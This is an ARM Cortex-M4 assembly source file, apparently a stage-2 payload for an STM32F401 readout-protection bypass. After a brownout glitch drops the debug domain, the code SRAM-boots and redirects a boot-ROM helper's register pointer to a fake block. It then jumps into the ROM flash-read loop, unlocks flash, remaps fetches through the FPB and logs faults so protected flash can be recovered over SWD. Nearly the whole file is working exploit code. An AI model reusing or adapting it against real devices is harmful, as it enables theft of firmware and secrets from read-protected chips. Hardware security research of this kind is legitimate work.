/* rom_gadget.S — stage2: SRAM-boot trampoline into boot-ROM flash-read paths
 *
 * Premise test: brownout dip kills the debug domain while SRAM survives; the
 * chip SRAM-boots this stage2 with NO debugger attached. stage2 redirects the
 * ROM transmit-helper's register-block pointer to a fake block in SRAM, then
 * jumps into the ROM's own flash read loop. PC is in ROM while the flash byte
 * is read (execution-origin gate 2 test), and the helper's "transmit" stores
 * the byte into the fake DR -> SRAM. SWD re-attach afterward recovers it.
 *
 * Variant dispatch (host writes variant id to 0x200030F0 before the dip):
 *   0 = CONTROL: ROM read loop with r5 = SRAM source (proves loop+transmit
 *       mechanics work from SRAM boot; DR gets a poison byte).
 *   1 = FLASH-PLAIN: ROM read loop with r5 = 0x08000000.
 *   2 = FLASH-UNLOCK: same, after stage2 performs the FLASH KEYR unlock
 *       sequence (what the genuine ROM init does before its read paths).
 *   3 = READER-TRICK: stage2 programs the FPB itself (REMAP table word0 =
 *       `ldr r0,[r0]; bx lr`, COMP0 matches word 0x08000100), then blx
 *       0x08000101 with r0 = 0x08000000. The fetch is remapped to the SRAM
 *       reader while PC is "in flash"; the data read either works (r0 gets
 *       the flash word) or faults/stalls (reader-trick premise false).
 *   4 = FETCH-PROBE: blx the address the host wrote to 0x200030F4 (thumb bit
 *       set). If it returns, 0x600DF00D lands in 0x20003020; if the fetch
 *       faults, the HardFault handler records the stacked PC. Firmware sweeps
 *       ROM addresses one per run to map which ROM fetches survive SRAM boot.
 *
 * Results (all in SRAM, recovered by SWD):
 *   0x20003010 = fake DR halfword (loop variants; pre-filled 0xAA55)
 *   0x20003018 = HardFault marker (0xFA17FA17) or poison
 *   0x2000301C = "GOK2" stage2-ran marker
 *   0x20003020 = reader-trick result word (host pre-fills 0x1BADB002)
 *   r5/r6/PC at halt = loop progress / park location
 *
 * ROM facts (disasm of stm32f401_bootrom.bin, base 0x1fff0000):
 *   0x1fff0550: ldrb.w r0,[r5],#1 ; bl 0x1fff039e ; subs r6,#1 ; cmp r6,#0 ; bne
 *   0x1fff039e: timeout global r5=[0x1fff0864](=0x20001A24); register block =
 *               [0x200006C4] (RAM global, pointer to I2C block); waits
 *               halfword [block+0x14].bit7 (TXE), then strh r4,[block+0x10].
 *   loop exit (r6==0): pop {r4,r5,r6,lr}; b 0x1fff0408 — parks petting IWDG,
 *               spinning on bit10 of the SAME fake block -> never returns.
 */
.syntax unified
.thumb
.cpu cortex-m4

.section .text
.globl _start
_start:                     /* vector table (host copies words 0-3 to 0x20000000) */
    .word 0x20006000        /* MSP: stack clear of payload/buffers */
    .word go + 1            /* Reset */
    .word 0                 /* reserved */
    .word fault + 1         /* HardFault */

go:
    /* fake register block at 0x20003000: SR(+0x14)=0x0080 (TXE), DR(+0x10) sink */
    ldr  r0, =0x20003014
    movs r1, #0x80
    strh r1, [r0, #0]
    ldr  r0, =0x20003010
    ldr  r1, =0xAA55
    strh r1, [r0, #0]       /* pre-fill: unchanged = helper never transmitted */

    /* redirect ROM interface-pointer global [0x200006C4] -> fake block */
    ldr  r0, =0x200006C4
    ldr  r1, =0x20003000
    str  r1, [r0, #0]

    /* stage2-ran marker */
    ldr  r0, =0x2000301C
    ldr  r1, =0x324F4B47    /* "GOK2" */
    str  r1, [r0, #0]

    /* variant dispatch */
    ldr  r4, =0x200030F0
    ldr  r4, [r4, #0]
    cmp  r4, #0
    beq  v_control
    cmp  r4, #1
    beq  v_flash_plain
    cmp  r4, #2
    beq  v_flash_unlock
    cmp  r4, #3
    beq  v_reader
    cmp  r4, #4
    beq  v_fetchprobe
    cmp  r4, #5
    beq  v_dataread
    movs r5, #0xBD
    b    park_bad

v_control:
    ldr  r5, =0x20003000    /* SRAM source (fake block, poison bytes) */
    movs r6, #1
    b    do_loop

v_flash_plain:
    ldr  r5, =0x08000000
    movs r6, #1
    b    do_loop

v_flash_unlock:
    /* replicate ROM init's flash unlock (KEYR sequence) */
    ldr  r0, =0x40023C04
    ldr  r1, =0x45670123
    str  r1, [r0, #0]
    ldr  r1, =0xCDEF89AB
    str  r1, [r0, #0]
    ldr  r5, =0x08000000
    movs r6, #1
    b    do_loop

v_reader:
    /* FPB remap table at 0x20003040: word0 = ldr r0,[r0] | bx lr */
    ldr  r0, =0x20003040
    ldr  r1, =0x47706800
    str  r1, [r0, #0]
    ldr  r0, =0xE0002004    /* FP_REMAP -> table */
    ldr  r1, =0x20003040
    str  r1, [r0, #0]
    ldr  r0, =0xE0002008    /* FP_COMP0: match word 0x08000100, enabled */
    ldr  r1, =0x08000101
    str  r1, [r0, #0]
    ldr  r0, =0xE0002000    /* FP_CTRL: KEY|ENABLE (last) */
    movs r1, #3
    str  r1, [r0, #0]
    /* call the reader with r0 = flash target */
    ldr  r0, =0x08000000
    ldr  r1, =0x08000101
    blx  r1                 /* remapped fetch executes reader; r0 = flash word */
    ldr  r1, =0x20003020
    str  r0, [r1, #0]       /* park result for SWD */
    movs r5, #0xEE          /* reader-ran marker */
    b    park

v_dataread:
    /* pure DATA reads from stage2 (SRAM boot) — no jumps into ROM at all.
     * flash[0] should be 0xDEADBEEF (known plaintext). Distinguish:
     *   0xDEADBEEF = flash data read WORKS   0x11111111 = ROM data read works
     *   0x22222222 = both reads faulted */
    ldr  r0, =0x2000302C
    movs r1, #0x22
    lsls r1, r1, #4
    lsls r1, r1, #4
    lsls r1, r1, #4
    adds r1, #0x22
    lsls r1, r1, #4
    lsls r1, r1, #4
    lsls r1, r1, #4
    adds r1, #0x22       /* r1 = 0x22222222 (no ldr-literal, avoid ROM pools) */
    str  r1, [r0, #0]
    ldr  r0, =0x08000000
    ldr  r1, [r0, #0]    /* flash data read */
    ldr  r0, =0x20003020
    str  r1, [r0, #0]
    ldr  r0, =0x1FFF0000
    ldr  r1, [r0, #0]    /* ROM data read */
    ldr  r0, =0x2000302C
    str  r1, [r0, #0]
    movs r5, #0xDD       /* both reads survived */
    b    park

v_fetchprobe:
    /* blx the host-supplied address (thumb bit set by host) */
    ldr  r0, =0x600DF00D    /* r0 = call marker, visible in fault frame regs */
    ldr  r1, =0x200030F4
    ldr  r1, [r1, #0]
    blx  r1
    ldr  r1, =0x20003020
    ldr  r2, =0x600DF00D
    str  r2, [r1, #0]       /* result = 0x600DF00D = fetch+return OK */
    b    park

do_loop:
    /* jump into the ROM read loop (thumb bit set); lr is garbage but the
     * loop exit path parks in the RX-wait helper without using it */
    ldr  r0, =0x1fff0551
    bx   r0

park_bad:
    lsls r5, r5, #8
park:
    b    park

fault:
    ldr  r0, =0x20003018
    ldr  r1, =0xFA17FA17    /* HardFault marker */
    str  r1, [r0, #0]
    /* stacked exception frame (MSP): r0@0 r1@4 r2@8 r3@12 r12@16 lr@20 pc@24
     * psr@28 — stacked PC pins the exact faulting instruction */
    mrs  r0, msp
    ldr  r1, [r0, #24]      /* stacked PC */
    ldr  r2, =0x20003024
    str  r1, [r2, #0]
    ldr  r1, [r0, #20]      /* stacked LR */
    ldr  r2, =0x20003028
    str  r1, [r2, #0]
1:  b 1b
